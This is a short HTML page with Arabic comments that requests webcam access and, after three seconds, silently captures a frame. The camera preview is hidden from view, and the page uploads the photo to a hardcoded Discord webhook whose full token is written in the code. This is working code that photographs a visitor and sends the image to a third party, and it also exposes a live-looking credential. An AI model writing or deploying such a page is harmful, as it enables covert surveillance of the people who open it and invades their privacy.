<html>
  <body>
    <h1>تجربة تصوير كاميرا وإرسالها ويب هوك</h1>
    <button id="start">ابدأ التصوير والإرسال</button>
    <video id="video" autoplay style="display:none;"></video>

    <script>
      const webhookURL = "https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv";

      document.getElementById('start').onclick = () => {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;

            // بعد 3 ثواني نصور صورة من الفيديو ونرسلها
            setTimeout(() => {
              const canvas = document.createElement('canvas');
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              const ctx = canvas.getContext('2d');
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

              // صورة بصيغة Base64
              const imageData = canvas.toDataURL('image/png');

              // نرسل الصورة على ويب هوك كملف مرفق
              const formData = new FormData();
              formData.append('file', dataURItoBlob(imageData), 'snapshot.png');

              fetch(webhookURL, {
                method: 'POST',
                body: formData
              });

              // نوقف الكاميرا بعد التصوير
              stream.getTracks().forEach(track => track.stop());
            }, 3000);
          })
          .catch(err => {
            alert('رفضت الإذن أو صار خطأ');
          });
      };

      // دالة تحول Base64 الى Blob عشان نرسلها كملف
      function dataURItoBlob(dataURI) {
        const byteString = atob(dataURI.split(',')[1]);
        const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
          ia[i] = byteString.charCodeAt(i);
        }
        return new Blob([ab], { type: mimeString });
      }
    </script>
  </body>
</html>
